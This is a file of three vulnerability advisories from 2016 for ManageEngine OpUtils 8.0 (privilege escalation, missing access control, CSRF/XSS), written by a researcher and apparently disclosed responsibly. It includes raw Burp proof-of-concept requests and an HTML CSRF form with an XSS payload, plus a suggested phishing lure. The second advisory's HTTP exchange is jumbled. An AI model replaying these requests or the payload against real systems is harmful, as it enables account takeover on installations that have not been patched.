@@ -1,0 +1,308 @@
+===================================================================================
+Privilege escalation Vulnerability in ManageEngine oputils
+===================================================================================
+
+Overview
+========
+
+Title:- Privilege escalation Vulnerability in ManageEngine oputils
+Author: Kaustubh G. Padwad
+Vendor: ZOHO Corp
+Product: ManageEngine oputils
+Tested Version: : oputils 8.0
+Severity: HIGH
+
+Advisory ID
+============
+2016-05-Manage_Engine
+
+About the Product:
+==================
+OpUtils is a Switch Port & IP Address Management software that helps network engineers manage their Switches and IP Address Space with ease. With its comprehensive set of 30+ tools, it helps them to perform network monitoring tasks like detecting a rogue device intrusion, keep a check on bandwidth usage, monitoring availability of critical devices, backing up Cisco configuration files and more.
+
+Description:
+============
+
+This Privilege escalation vulnerability enables an Normal user to escalate privilege and become administrator of the application.
+
+Vulnerability Class:
+====================
+Top 10 2014-I2 Insufficient Authentication/Authorization https://www.owasp.org/index.php/Top_10_2014-I2_Insufficient_Authentication/Authorization
+
+How to Reproduce: (POC):
+========================
+
+* you should have Read only user  on OpUtils
+
+* login with that account to get api key something like 375e0fa0-0bb3-479c-a646-debb90a1f5f0
+
+* Setup Burp and use change user password request and change userName to admin and newPwd to desire password HUrry you are admin now. :)
+
+POC
+====
+
+Burp Requst
+-----------
+POST /oputilsapi/admin?key=375e0fa0-0bb3-479c-a646-debb90a1f5f0 HTTP/1.1
+
+Host: 192.168.1.10:7080
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+
+Accept: application/json, text/javascript, */*; q=0.01
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Referer: http://192.168.1.10:7080/apiclient/ember/index.jsp
+
+Content-Length: 151
+
+Cookie: OPUTILSJSESSIONID=AC6E9B2C01FDDD5E27C245BC6F31C032; JSESSIONID=B59D8FD4B17DB7200A991299F4034DF1; OPUTILSJSESSIONIDSSO=1F8857A875EB16418DD7889DB60CFB66
+
+Connection: keep-alive
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+
+
+v=1&format=json&operation=DELETE_OR_MODIFY_USER&action1=MODIFY_USER&userInAction=kk&userRole=Administrator&userAuthType=Local&contactinfoID=2&loginID=2
+
+
+Response
+--------
+HTTP/1.1 200 OK
+
+Server: Apache-Coyote/1.1
+
+Set-Cookie: OPUTILSJSESSIONIDSSO=1F8857A875EB16418DD7889DB60CFB66; Expires=Thu, 01-Jan-1970 00:00:10 GMT
+
+Set-Cookie: OPUTILSJSESSIONID=184C572A3D2E17EEC3B78C027B925421; Path=/
+
+Content-Type: application/json;charset=UTF-8
+
+Content-Length: 90
+
+Date: Thu, 04 Feb 2016 13:27:09 GMT
+
+
+
+{"input":"{newUserName=MODIFY_USER, userInAction=kk, domainName=null}","status":"Success"}
+
+
+Mitigation
+==========
+Upgrade to next Service pack
+
+Disclosure:
+===========
+04-Feb-2016 Repoerted to vendor
+11-Feb-2016 Fixed By vendor
+
+################################################################################
+
+====================================================================================================
+Missing Function Level Access control Vulnerability in OPutils
+====================================================================================================
+
+Overview
+========
+
+Title:- Missing Function Level Access control Vulnerability in ManageEngine OpUtils
+Author: Kaustubh G. Padwad
+Vendor: ZOHO Corp
+Product: OPUTILS
+Tested Version: : OPUTILS 8.0
+Severity: Medium
+
+Advisory ID
+============
+2016-06-Manage_Engine
+
+Description:
+============
+
+This Missing Function Level Access Control vulnerability enables an Normal user to execute the Adinisitative Task.
+
+Vulnerability Class:
+====================
+2013-A7-Missing Function Level Access Control https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control
+
+How to Reproduce: (POC):
+========================
+
+* Get The administrative Task URL from either demo site or download locally
+
+* Now Login With Normal User
+
+* Paste the below requst or any other for Ex. http://IP-OF-Server:7080/oputilsapi/admin?v=1&format=json&key=375e0fa0-0bb3-479c-a646-debb90a1f5f0&operation=GET_USER_DETAILS
+
+POC
+====
+
+Burp Requst
+-----------
+GET /oputilsapi/admin?v=1&format=json&key=375e0fa0-0bb3-479c-a646-debb90a1f5f0&operation=GET_USER_DETAILS HTTP/1.1
+
+Host: 192.168.1.10:7080
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+
+
+Response
+--------
+
+
+HTTP/1.1 200 OK
+erver: Apache-Coyote/1.1
+
+Content-Type: application/json;charset=UTF-8
+
+Content-Length: 589
+
+Date: Thu, 04 Feb 2016 14:28:25 GMT
+
+
+
+{"result":[{"ad-domain-name":"","user-name":"admin","account-created-time":"30 Jan 16, 12:20 AM","Action":"","user-contactinfo-id":"1","user-role":"Administrator","user-description":"--","user-phone-number":"","user-email":"","user-id":"1","ad-domain-id":"","user-login-id":"1"},{"ad-domain-name":"","user-name":"kk","account-created-time":"30 Jan 16, 12:23 AM","Action":"","user-contactinfo-id":"2","user-role":"Read Only User","user-description":"--","user-phone-number":"","user-email":"","user-id":"2","ad-domain-id":"","user-login-id":"2"}],"input":"{userId=null}","status":"Success"}
+Server: Apache-Coyote/1.1
+
+Access-Control-Allow-Origin: *
+
+Access-Control-Allow-Methods: GET,POST
+
+Access-Control-Max-Age: 5000
+
+Content-Type: application/json;charset=UTF-8
+
+Date: Sat, 30 Jan 2016 21:39:03 GMT
+
+Content-Length: 19
+
+
+
+{"resolved":true}
+
+Accept-Encoding: gzip, deflate
+
+X-Requested-With: XMLHttpRequest
+
+Referer: http://192.168.1.10:7080/apiclient/ember/index.jsp
+
+Cookie: OPUTILSJSESSIONID=C256E5B41CC23B33ACF94D206E243FB2; JSESSIONID=B59D8FD4B17DB7200A991299F4034DF1; OPUTILSJSESSIONIDSSO=28A377BA0B7D0C6E21D1E2B3A3E4A371
+
+Connection: keep-alive
+
+Mitigation
+==========
+Upgrade to NextService Pack
+
+Disclosure:
+===========
+04-Feb-2016 Repoerted to vendor
+11-Feb-2016 Fixed By Vendor
+
+################################################################################
+
+===============================================================================
+CSRF and XXS In Manage Engine oputils
+===============================================================================
+
+Overview
+========
+
+* Title : CSRF  and XSS In Manage Engine OPutils
+* Author: Kaustubh G. Padwad
+* Plugin Homepage: https://www.manageengine.com/products/oputils/
+* Severity: HIGH
+* Version Affected: Version 8.0
+* Version Tested : Version 8.0
+* version patched:
+
+Advisory ID
+============
+2016-01-Manage_Engine
+
+Description
+===========
+
+Vulnerable Parameter
+--------------------
+1. RouterName
+2. action Form
+3. selectedSwitchTab
+4. ipOrHost
+5. alertMsg
+6. hostName
+7. switchID
+8. oidString
+
+About Vulnerability
+-------------------
+This Application is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin?s browser can be made t do almost anything the admin user could typically do by hijacking admin's cookies etc.
+
+Vulnerability Class
+===================
+Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
+Cross Site Scripting       (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
+
+Steps to Reproduce: (POC)
+=========================
+
+* Add follwing code to webserver and send that malicious link to application Admin.
+* The admin should be loggedin when he clicks on the link.
+* Soical enginering might help here
+
+For Example :- Device password has been changed click here to reset
+
+####################CSRF COde#######################
+<html>
+
+  <body>
+
+    <form action="http://192.168.1.10:7080/DeviceExplorer.cc">
+
+      <input type="hidden" name="RouterName" value="kaus"><img&#32;src&#61;a&#32;onerror&#61;confirm&#40;"Kaustubh"&#41;>tubh" />
+
+      <input type="submit" value="Submit request" />
+
+    </form>
+
+  </body>
+
+</html>
+
+
+Mitigation
+==========
+Upgrade to next service pack
+
+Change Log
+==========
+
+Disclosure
+==========
+28-January-2016 Reported to Developer
+28-January-2016 Acknodlagement from developer
+11-February-2016 Fixed by vendor ()
+
+credits
+=======
+* Kaustubh Padwad
+* Information Security Researcher
+* kingkaustubh@me.com
+* https://twitter.com/s3curityb3ast
+* http://breakthesec.com
+* https://www.linkedin.com/in/kaustubhpadwad
